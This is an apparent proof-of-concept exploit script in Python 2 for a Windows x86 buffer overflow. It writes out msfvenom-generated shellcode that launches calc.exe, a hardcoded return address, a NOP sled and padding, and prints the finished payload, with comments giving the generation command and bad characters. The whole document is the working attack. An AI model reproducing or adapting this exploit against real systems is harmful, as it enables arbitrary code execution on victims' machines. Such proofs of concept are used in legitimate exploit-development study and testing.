#!/usr/bin/python -tt
#CALL EBX under 0x7E41BB6C
#msfvenom -p windows/exec CMD=calc.exe --platform windows -a x86  EXITFUNC=thread -f python -b "\x00\x0a\x0d\xff"
#adding 300 to ebx --> "\x83\xc3\x64"
#Shellcode length 220


jmpAddedEbx = "\xff\xe4"

buf =  ""
buf += "\xdd\xc2\xbd\x3e\xc0\xc8\x7d\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x31\x31\x6f\x18\x03\x6f\x18\x83\xc7\x3a\x22"
buf += "\x3d\x81\xaa\x20\xbe\x7a\x2a\x45\x36\x9f\x1b\x45\x2c"
buf += "\xeb\x0b\x75\x26\xb9\xa7\xfe\x6a\x2a\x3c\x72\xa3\x5d"
buf += "\xf5\x39\x95\x50\x06\x11\xe5\xf3\x84\x68\x3a\xd4\xb5"
buf += "\xa2\x4f\x15\xf2\xdf\xa2\x47\xab\x94\x11\x78\xd8\xe1"
buf += "\xa9\xf3\x92\xe4\xa9\xe0\x62\x06\x9b\xb6\xf9\x51\x3b"
buf += "\x38\x2e\xea\x72\x22\x33\xd7\xcd\xd9\x87\xa3\xcf\x0b"
buf += "\xd6\x4c\x63\x72\xd7\xbe\x7d\xb2\xdf\x20\x08\xca\x1c"
buf += "\xdc\x0b\x09\x5f\x3a\x99\x8a\xc7\xc9\x39\x77\xf6\x1e"
buf += "\xdf\xfc\xf4\xeb\xab\x5b\x18\xed\x78\xd0\x24\x66\x7f"
buf += "\x37\xad\x3c\xa4\x93\xf6\xe7\xc5\x82\x52\x49\xf9\xd5"
buf += "\x3d\x36\x5f\x9d\xd3\x23\xd2\xfc\xb9\xb2\x60\x7b\x8f"
buf += "\xb5\x7a\x84\xbf\xdd\x4b\x0f\x50\x99\x53\xda\x15\x55"
buf += "\x1e\x47\x3f\xfe\xc7\x1d\x02\x63\xf8\xcb\x40\x9a\x7b"
buf += "\xfe\x38\x59\x63\x8b\x3d\x25\x23\x67\x4f\x36\xc6\x87"
buf += "\xfc\x37\xc3\xeb\x63\xa4\x8f\xc5\x06\x4c\x35\x1a"

garbage = jmpAddedEbx + 'A' * 202 + '\xAD\x02\xB2\x7C' + '\x90' * 9 + buf + 'C' * (10000 - 204 - 16 - 389)

print garbage
